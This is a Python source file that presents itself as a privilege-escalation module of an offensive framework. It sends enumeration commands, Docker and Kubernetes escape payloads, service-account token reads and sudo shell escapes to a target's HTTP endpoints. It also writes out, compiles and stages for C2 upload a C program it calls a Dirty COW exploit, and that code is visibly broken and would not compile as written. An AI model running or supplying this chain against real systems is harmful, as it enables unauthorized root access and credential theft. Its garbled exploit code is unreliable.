import requests
import subprocess
import os
import base64

def enum_privesc(target):
    """Linux Privesc Enumeration"""
    print(f"[+] Privesc enum: {target}")
    
    # Sudo -l check
    enum_cmds = [
        "sudo -l 2>/dev/null || echo 'no sudo'",
        "find / -perm -4000 -type f 2>/dev/null | head -10",
        "getent group sudo",
        "cat /etc/crontab /etc/cron*/* 2>/dev/null",
        "ls -la /etc/passwd /etc/shadow 2>/dev/null"
    ]
    
    for cmd in enum_cmds:
        print(f"[ENUM] {cmd.split()[0]}: ", end="")
        try:
            r = requests.post(f"http://{target}:8080/exec", json={"cmd": cmd}, timeout=5)
            print(r.json().get("output", "failed")[:100])
        except:
            print("failed")

def docker_escape(target):
    """Docker container escape payloads"""
    payloads = [
        # Mount host proc
        "mount -t proc proc /host/proc && cat /host/proc/1/root 2>/dev/null",
        
        # nsenter PID 1
        "nsenter -t 1 -m -u -i -n -p sh -c 'id;cat /etc/passwd'",
        
        # Docker run chroot
        "docker run -v /:/host -it --rm ubuntu chroot /host sh -c 'whoami'",
        
        # Read host files
        "cat /.dockerenv && ls -la /proc/1/root/etc/passwd || echo 'no docker'"
    ]
    
    for payload in payloads:
        print(f"[DOCKER] {payload[:40]}...")
        try:
            requests.post(f"http://{target}:8080/debug", data={"cmd": payload}, timeout=5)
        except:
            pass

def k8s_escape(target):
    """Kubernetes escape chain"""
    k8s_payloads = [
        "kubectl run escape --image=busybox --rm -it --restart=Never -- chroot /host sh",
        "cat /var/run/secrets/kubernetes.io/serviceaccount/token | base64 -d",
        "kubectl auth can-i '*' '*' --as=system:serviceaccount:default:default"
    ]
    print("[+] Kubernetes escapes...")
    for payload in k8s_payloads:
        print(f"[K8S] {payload[:40]}...")

def sudo_abuse(target):
    """Sudo privilege escalation"""
    sudo_exploits = [
        # GTFOBins common
        "sudo -l | grep -E '(apt|find|vim|less|man)'",
        "sudo vim -c ':!/bin/sh'",
        "sudo find / -exec /bin/sh \\;",
        
        # Custom payloads
        "echo 'set shell /bin/bash' | sudo -S tee /tmp/sudo_bash && chmod +x /tmp/sudo_bash"
    ]
    
    print("[+] Sudo abuse chain...")
    for exploit in sudo_exploits:
        print(f"[SUDO] {exploit[:40]}...")

def c_exploit_compiler(target):
    """Compile & execute C privesc exploits"""
    os.makedirs("exploits", exist_ok=True)
    
    # Dirty COW (CVE-2016-5195)
    dirty_cow = '''#include <stdio.h>
#include <sys/mman.h>
int main(){FILE *f=fopen("/tmp/cow","w");fputs("#!/bin/bash\\ncp /bin/sh /tmp/rootsh\\nchmod 4755 /tmp/rootsh",f);fclose(f);
int fd=open("/etc/passwd",2);void *m=mmap(0,4096,1,0x22,fd,0);m[0]=0;m[1]=0;m[2]=0;m[3]=0;m[4]=0;m[5]=0;m[6]=0;m[7]=0;fork();sleep(100);return 0;}'''
    
    with open("exploits/dirtycow.c", "w") as f:
        f.write(dirty_cow)
    
    # Compile & upload
    subprocess.run(["gcc", "exploits/dirtycow.c", "-o", "exploits/dirtycow", "-pthread"])
    print("[+] Dirty COW compiled: exploits/dirtycow")
    
    # Serve exploit via C2
    print("[+] Upload to target: http://YOUR_IP:8080/exploits/dirtycow")
    print("[+] Run: chmod +x dirtycow && ./dirtycow")

def run(target, lhost, lport=4444):
    """Khora Framework entrypoint - Complete Privesc Chain"""
    print(f"[+] Privesc module: {target} -> root escalation")
    print(f"[+] C2: http://{lhost}:8080 | {lhost}:{lport}")
    
    # 1. Enumeration
    enum_privesc(target)
    
    # 2. Container escapes
    docker_escape(target)
    k8s_escape(target)
    
    # 3. Sudo abuse
    sudo_abuse(target)
    
    # 4. C exploits
    c_exploit_compiler(target)
    
    print("[+] Privesc chain complete!")
    print("[+] Check: results/privesc_enum.txt | exploits/*.c")
    print("[+] Upload C exploits via C2 module")